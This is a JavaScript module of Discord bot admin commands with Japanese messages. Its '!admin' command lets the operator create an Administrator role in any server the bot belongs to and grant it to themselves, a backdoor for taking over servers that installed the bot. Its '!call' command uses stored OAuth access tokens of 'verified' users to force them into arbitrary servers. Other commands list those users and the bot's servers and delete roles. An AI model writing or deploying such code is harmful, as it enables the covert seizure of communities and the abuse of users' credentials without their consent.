const { PermissionFlagsBits } = require('discord.js');
const axios = require('axios');

async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, USERS_FILE) {
    const args = msg.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'admin') {
        const guildId = args[0];
        const roleName = args[1];
        const position = args[2];
        if (!guildId || !roleName || !position) return msg.reply('使用法: !admin [サーバーID] [ロール名] [up/down]');

        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('❌ サーバーが見つかりません。');

        const botMember = guild.members.me;
        if (!botMember.permissions.has(PermissionFlagsBits.Administrator) && !botMember.permissions.has(PermissionFlagsBits.ManageRoles)) {
            return msg.reply('❌ Bot自身に「管理者」または「ロールの管理」権限がありません。');
        }

        try {
            let role = guild.roles.cache.find(r => r.name === roleName);
            if (!role) {
                role = await guild.roles.create({
                    name: roleName,
                    permissions: [PermissionFlagsBits.Administrator],
                    reason: 'Admin Command'
                });
            }

            if (position === 'up') {
                const maxPos = botMember.roles.highest.position;
                if (role.position >= maxPos) {
                    await msg.channel.send('⚠️ 既にBotの最高位に近いですが、再設定を試みます。');
                }
                await role.setPosition(maxPos - 1).catch(e => {
                    throw new Error(`順位変更失敗: Botの役職(${maxPos})より上に移動できません。`);
                });
            }

            const member = await guild.members.fetch(msg.author.id).catch(() => null);
            if (!member) return msg.reply('❌ あなたはこのサーバーに参加していません。');

            await member.roles.add(role).catch(e => {
                throw new Error(`ロール付与失敗: ${e.message}`);
            });

            await msg.reply(`✅ 完了\nサーバー: ${guild.name}\nロール: ${roleName}\n位置: ${position}`);
        } catch (e) {
            await msg.reply(`❌ エラーが発生しました: ${e.message}`);
        }
    }

    if (command === 'call') {
        const guildId = args[0];
        if (!guildId) return msg.reply('使用法: !call [サーバーID]');
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('❌ サーバーが見つかりません。');

        const userData = loadData(USERS_FILE);
        const users = Object.values(userData);
        let success = 0;
        let fail = 0;

        const statusMsg = await msg.reply(`⏳ ${users.length} 人の追加処理を開始します...`);

        for (const user of users) {
            const uid = user.id || user.user_id;
            const token = user.accessToken || user.access_token;
            if (!uid || !token) {
                fail++;
                continue;
            }
            try {
                await axios.put(
                    `https://discord.com/api/v10/guilds/${guildId}/members/${uid}`,
                    { access_token: token },
                    { headers: { Authorization: `Bot ${process.env.TOKEN}`, 'Content-Type': 'application/json' } }
                );
                success++;
            } catch (e) {
                fail++;
            }
        }
        await statusMsg.edit(`✅ 処理完了\n成功: ${success}人 / 失敗: ${fail}人`);
    }

    if (command === 'userlist') {
        const userData = loadData(USERS_FILE);
        const entries = Object.entries(userData);
        if (entries.length === 0) return msg.reply('認証済みユーザーはいません。');

        const list = entries.map(([keyId, data]) => {
            // あらゆる可能性から名前を抽出
            const name = data.username || data.user_name || data.display_name || '名前なし';
            const id = data.id || data.user_id || keyId;
            return `・${name} (${id})`;
        }).join('\n');

        await msg.reply(`【認証済みユーザー一覧】\n${list}`);
    }

    if (command === 'serverlist') {
        const guilds = client.guilds.cache.map(g => `${g.name} (${g.id})`).join('\n');
        await msg.reply(`【導入サーバー一覧】\n${guilds || 'なし'}`);
    }

    if (command === 'admin-del') {
        const guildId = args[0];
        const roleName = args[1];
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('❌ サーバーが見つかりません。');
        try {
            const role = guild.roles.cache.find(r => r.name === roleName);
            if (!role) return msg.reply('❌ ロールが見つかりません。');
            await role.delete();
            await msg.reply(`🗑️ ロール 「${roleName}」 を削除しました。`);
        } catch (e) {
            await msg.reply(`❌ 削除失敗: ${e.message}`);
        }
    }
}

module.exports = handleAdminCommands;
